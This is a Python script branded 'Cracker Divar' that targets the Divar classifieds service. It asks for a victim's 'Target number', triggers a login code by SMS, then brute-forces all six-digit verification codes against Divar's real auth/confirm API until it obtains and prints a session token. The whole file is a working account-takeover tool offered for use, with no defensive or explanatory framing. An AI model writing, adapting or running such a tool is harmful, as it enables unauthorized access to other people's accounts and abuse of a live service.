from requests import post
from colorama import init
init()
class Divar:
    class colors:
        RED = '\033[00;31m'
        GREEN = '\033[00;32m'
        LIGHT_GREEN = '\033[01;32m'
        YELLOW = '\033[01;33m'
        LIGHT_RED = '\033[01;31m'
        BLUE = '\033[00;34m'
        PINK = '\033[01;35m'
        CYAN = '\033[00;36m'

    @staticmethod
    def test_normal(mobile_number):

        for i in range(1000000):
            i = str(i).zfill(6)
            payload = {"phone": mobile_number, "code": i}
            response = post("https://api.divar.ir/v5/auth/confirm", json=payload)
            info = response.json()

            if 'message' in info:
                if 'کد تایید معتبر نیست.' == info['message']:
                    print(f"\n\n{Divar.colors.RED}[{Divar.colors.GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}The code is wrong ! => {i}")
                else:
                    print(f"\n\n{Divar.colors.RED}[{Divar.colors.GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}The code is correct ! => {i}\n{Divar.colors.RED}[{Divar.colors.GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}Token: {info['message']}")
            elif 'token' in info:
                print(f"\n\n{Divar.colors.RED}[{Divar.colors.GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}The code is correct ! => {i}\n{Divar.colors.RED}[{Divar.colors.GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}Token: {info['token']}")
                exit()

    @staticmethod
    def test_custom(mobile_number):

        number = input(f"{Divar.colors.RED}[{Divar.colors.LIGHT_GREEN}={Divar.colors.RED}] {Divar.colors.GREEN}What number to start with?{Divar.colors.YELLOW} 6 digits (ex : 876541) : {Divar.colors.CYAN}")
        for i in range(int(number), 999999):
            payload = {"phone": mobile_number, "code": str(i)}
            response = post("https://api.divar.ir/v5/auth/confirm", json=payload)
            info = response.json()
            if 'message' in info:
                if 'کد تایید معتبر نیست.' == info['message']:
                    print(f"{Divar.colors.RED}[{Divar.colors.RED}×{Divar.colors.RED}] {Divar.colors.RED}Code is wrong  ! => {i}")
                else:
                    print(f"\n\n{Divar.colors.RED}[{Divar.colors.LIGHT_GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}The code is correct ! => {Divar.colors.LIGHT_GREEN}{i}\n{Divar.colors.RED}[{Divar.colors.LIGHT_GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}Token: {Divar.colors.LIGHT_GREEN}{info['message']}")
            elif 'token' in info:
                print(f"\n\n{Divar.colors.RED}[{Divar.colors.LIGHT_GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}The code is correct ! => {Divar.colors.LIGHT_GREEN}{i}\n{Divar.colors.RED}[{Divar.colors.LIGHT_GREEN}√{Divar.colors.RED}] {Divar.colors.GREEN}Token: {Divar.colors.LIGHT_GREEN}{info['token']}")
                exit()

    def common(self):
        print (f"""{Divar.colors.CYAN}

                                                                                
                             -= :+-                                     
                         .=#@@- %@@@#=.                                 
                      :+%@@@@@= #@@@@@@%*-                              
                  .=#@@@@@@@@#-:#@@@@@@@@@@#=.                          
               :+%@@@@@@@@@@@#==*@@@@@@@@@@@@@%+:                       
           .=#@@@@@@@@@@@@@@@@@* =@@@@@@@@@@@@@@@@#=.                   
         -*####@@@@@@@@@@@@%###. *##@@@@@@@@@@@@%####*-                 
               =#%@@@@@@@#*.        +#@@@@@@@@##.                       
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:{Divar.colors.LIGHT_GREEN}Cracker Divar{Divar.colors.CYAN}*@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
                 +@@@@@@@:            *@@@@@@@                          
               ..*@@@@@@@=.         ..#@@@@@@@:.                        
               =###########:        +###########.                       
                                                                                
{Divar.colors.LIGHT_RED}                                                                                                                                                                                    
              #@#%*.   .@=   =@. %*    #@#     #@#%#:     
              #% .@+   .@=   .@+-@-   .@%@.    #%.:@#     
              #% .@+   .@=    *%*%    =@:@=    #@*%@:     
              #%.-@=   .@=    :@@=    #@+@#    #%  @*     
              +##*-    .#-     *#.    #=.=#    ++  #=     
                      {Divar.colors.RED}Git & Tg : @esfelurm            
						
""")
        mobile_number = input(f"{Divar.colors.LIGHT_RED}[{Divar.colors.LIGHT_GREEN}={Divar.colors.LIGHT_RED}] {Divar.colors.GREEN}Enter the Target number :{Divar.colors.CYAN} ")  
        post("https://api.divar.ir/v8/auth/authenticate",json={"phone":mobile_number})
        type_no = input(f"\n\n{Divar.colors.LIGHT_RED}[{Divar.colors.LIGHT_GREEN}1{Divar.colors.LIGHT_RED}] {Divar.colors.GREEN}Test numbers from 000000 to 999999 \n{Divar.colors.RED}[{Divar.colors.LIGHT_GREEN}2{Divar.colors.RED}] {Divar.colors.GREEN}Be a custom number (start testing from any number you want) \n\n  ==> {Divar.colors.CYAN}")
        if type_no == "1":
            self.test_normal(mobile_number)
        elif type_no == "2":
            self.test_custom(mobile_number)
        else:
            print(f"{Divar.colors.RED}error ! ")
            exit()

Divar().common()
